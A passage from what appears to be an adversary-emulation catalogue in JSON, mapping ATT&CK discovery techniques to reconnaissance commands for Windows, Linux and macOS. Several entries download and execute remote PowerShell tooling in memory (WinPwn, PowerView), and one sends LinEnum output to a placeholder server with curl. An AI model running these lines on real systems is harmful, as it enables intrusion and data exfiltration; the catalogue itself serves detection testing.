            "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n",
            "command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -gcb -sc trustdmp"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=organizationalUnit)"
         },
         {
            "description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\" forest -n %userdomain% && \"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\" domain -n %userdomain%"
         },
         {
            "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose"
         },
         {
            "description": "Determine the Windows Domain of a computer",
            "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n"
         }
      ]
   },
   "T1082": {
      "technique_name": "System Information Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n",
            "command": "csrutil status"
         },
         {
            "description": "Collect general computer informations via GeneralRecon function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Generalrecon -consoleoutput -noninteractive"
         },
         {
            "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
            "command": "set"
         },
         {
            "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); itm4nprivesc -noninteractive -consoleoutput"
         },
         {
            "description": "Identify system hostname for Linux and macOS systems.\n",
            "command": "hostname"
         },
         {
            "description": "The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\\Windows\\System32\\config or c:\\Windows\\System32\\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/\n",
            "command": "wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs"
         },
         {
            "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); Invoke-SharpUp -command \"audit\""
         },
         {
            "description": "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n",
            "command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios"
         },
         {
            "description": "General privesc checks using the otherchecks function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput"
         },
         {
            "description": "Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n",
            "command": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\""
         },
         {
            "description": "Powersploits privesc checks using oldchecks function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); oldchecks -noninteractive -consoleoutput"
         },
         {
            "description": "Executes the driverquery command to list drivers installed on the system. Adversaries utilize the feature to enumerate the driver and it can be\nused for Exploitation. \ncommand /v - provide verbose output but not valid for signed drivers\n        /si - provide information about signed drivers \n",
            "command": "driverquery /v && driverquery /si"
         },
         {
            "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",
            "command": "cscript \"d06deb_griffon_recon.vbs\""
         },
         {
            "description": "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n",
            "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\" -force      ; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzAccount -Credential $Credential; Connect-AzureAD -Credential $Credential; Scan-AzureAdmins -UseCurrentCred"
         },
         {
            "description": "Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n- https://evasions.checkpoint.com/techniques/registry.html\n",
            "command": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion && reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion"
         },
         {
            "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command \"-group=all\"; pause"
         },
         {
            "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
            "command": "env"
         },
         {
            "description": "Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.\n",
            "command": "lsmod; kmod list; grep vmw /proc/modules"
         },
         {
            "description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n",
            "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi; if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi; if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi; if [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi; if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi; if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi; if [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi; if [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi"
         },
         {
            "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); RBCD-Check -consoleoutput -noninteractive"
         },
         {
            "description": "Identify System Info\n",
            "command": "system_profiler; ls -al /Applications"
         },
         {
            "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); winPEAS -noninteractive -consoleoutput"
         },
         {
            "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n",
            "command": "systeminfo && reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
         },
         {
            "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
            "command": "hostname"
         },
         {
            "description": "Gathers local system information using the Morerecon function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Morerecon -noninteractive -consoleoutput"
         },
         {
            "description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n",
            "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"; sudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"; sudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"; sudo lsmod | grep -i \"virtio_pci\\|virtio_net\"; sudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\""
         },
         {
            "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n",
            "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid"
         },
         {
            "description": "Identify System Info\n",
            "command": "uname -a >> /tmp/T1082.txt; if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi; if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   ; if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi; uptime >> /tmp/T1082.txt; cat /tmp/T1082.txt 2>/dev/null"
         },
         {
            "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson"
         },
         {
            "description": "Download and execute LinEnum.sh",
            "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n"
         },
         {
            "description": "Discover the PowerShell version",
            "command": "$PSVersionTable\n"
         },
         {
            "description": "Find OS Version",
            "command": "[environment]::OSVersion.Version\n"
         },
         {
            "description": "Discover all directories containing deletable files by user",
            "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"
         }
      ]
   },
   "T1018": {
      "technique_name": "Remote System Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n",
            "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip neighbour show"
         },
         {
            "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n",
            "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi;  ;  arp -a | grep -v '^?'"
         },
         {
            "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n",
            "command": "Get-AdComputer -Filter *"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc dclist"
         },
         {
            "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n",
            "command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\"); $DirectorySearcher.PropertiesToLoad.Add(\"Name\"); $Computers = $DirectorySearcher.findall(); foreach ($Computer in $Computers) {;   $Computer = $Computer.Properties.name;   if (!$Computer) { Continue };   Write-Host $Computer}"
         },
         {
            "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
            "command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()"
         },
         {
            "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
            "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}"
         },
         {
            "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n",
            "command": "nltest.exe /dclist:%userdnsdomain%"
         },
         {
            "description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n",
            "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip tcp_metrics show |grep --invert-match \"^127\\.\""
         },
         {
            "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n",
            "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done"
         },
         {
            "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n",
            "command": "arp -a"
         },
         {
            "description": "Identify remote systems with net.exe querying the Active Directory Domain Controller.\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Controller\" in the domain. Output will be via stdout.\n",
            "command": "net group /domain \"Domain controllers\""
         },
         {
            "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n",
            "command": "net view /domain && net view"
         },
         {
            "description": "Use the ip route command to display the kernels routing tables. \n",
            "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip route show"
         },
         {
            "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n",
            "command": "net group \"Domain Computers\" /domain"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer)"
         },
         {
            "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n",
            "command": "adidnsdump -u domain\\user -p password --print-zones 192.168.1.1"
         },
         {
            "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose"
         },
         {
            "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n",
            "command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
         },
         {
            "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n",
            "command": "try { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop }; catch { $_; exit $_.Exception.HResult }"
         },
         {
            "description": "Locate all active IP and FQDNs on the network",
            "command": "arp -a"
         },
         {
            "description": "Get a list of all computers in a domain",
            "command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n"
         },
         {
            "description": "Identify the remote domain controllers",
            "command": "nltest /dsgetdc:%USERDOMAIN%\n"
         },
         {
            "description": "Identify the organizations mail server",
            "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev"
         },
         {
            "description": "View the known_hosts file",
            "command": "cat ~/.ssh/known_hosts\n"
         },
         {
            "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain",
            "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n"
         },
         {
            "description": "Find hostname of remote IP in domain",
            "command": "nslookup #{remote.host.ip}\n"
         },
         {
            "description": "Find hostname of remote host",
            "command": "nbtstat -A #{remote.host.ip}"
         }
      ]
   },
   "T1135": {
      "technique_name": "Network Share Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip\nUpon execution avalaible network shares will be displayed in the commandline session\n",
            "command": "dir \\\\127.0.0.1\\c$ && dir \\\\127.0.0.1\\admin$ && dir \\\\127.0.0.1\\IPC$"
         },
         {
            "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session",
            "command": "net share"
         },
         {
            "description": "Network share enumeration using the shareenumeration function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); shareenumeration -noninteractive -consoleoutput"
         },
         {
            "description": "Network Share Discovery using smbstatus\n",
            "command": "sudo smbstatus --shares"
         },
         {
            "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n",
            "command": "net view \\\\localhost"
         },
         {
            "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose"
         },
         {
            "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n",
            "command": "get-smbshare"
         },
         {
            "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
            "command": "if (Test-Path \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\") { ; } else {New-Item -Type Directory \"C:\\Users\\puma-4\\Desktop\\\" -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\"};  ;  Import-Module \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\"; Invoke-ShareFinder -CheckShareAccess"
         },
         {
            "description": "Network Share Discovery\n",
            "command": "df -aH; smbutil view -g //computer1; showmount computer1"
         },
         {
            "description": "Network Share Discovery",
            "command": "Get-SmbShare | ConvertTo-Json"
         },
         {
            "description": "View the shares of a remote host",
            "command": "net view \\\\#{remote.host.fqdn} /all"
         }
      ]
   },
   "T1518": {
      "technique_name": "Software Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Start PowerUpSQL Checks using powerSQL function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); powerSQL -noninteractive -consoleoutput"
         },
         {
            "description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n",
            "command": "/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist; /usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist"
         },
         {
            "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n",
            "command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion"
         },
         {
            "description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Dotnetsearch -noninteractive -consoleoutput"
         },
         {
            "description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); dotnet -consoleoutput -noninteractive"
         },
         {
            "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n",
            "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize; Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
         },
         {
            "description": "Check to see what version of python is installed",
            "command": "python3 --version;python2 --version;python --version\n"
         },
         {
            "description": "Check to see if Gooogle Chrome browser is installed",
            "command": "which google-chrome\n"
         },
         {
            "description": "Determine the version of Internet Explorer running",
            "command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"
         },
         {
            "description": "Check to see if GoLang is installed",
            "command": "which go\n"
         }
      ]
   },
   "T1069.002": {
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.\nThe test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF\n",
            "command": "ldifde.exe -f C:\\Windows\\temp\\atomic_ldifde.txt -p subtree"
         },
         {
            "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
            "command": "net localgroup && net group /domain && net group \"enterprise admins\" /domain && net group \"domain admins\" /domain"
         },
         {
            "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
            "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D"
         },
         {
            "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose"
         },
         {
            "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
            "command": "Get-AdGroup -Filter *"
         },
         {
            "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose\""
         },
         {
            "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n",
            "command": "net groups \"Account Operators\" /doma && net groups \"Exchange Organization Management\" /doma && net group \"BUILTIN\\Backup Operators\" /doma && net group /domai \"Domain Admins\""
         },
         {
            "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
            "command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()"
         },
         {
            "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n",
            "command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name"
         },
         {
            "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n",
            "command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}"
         },
         {
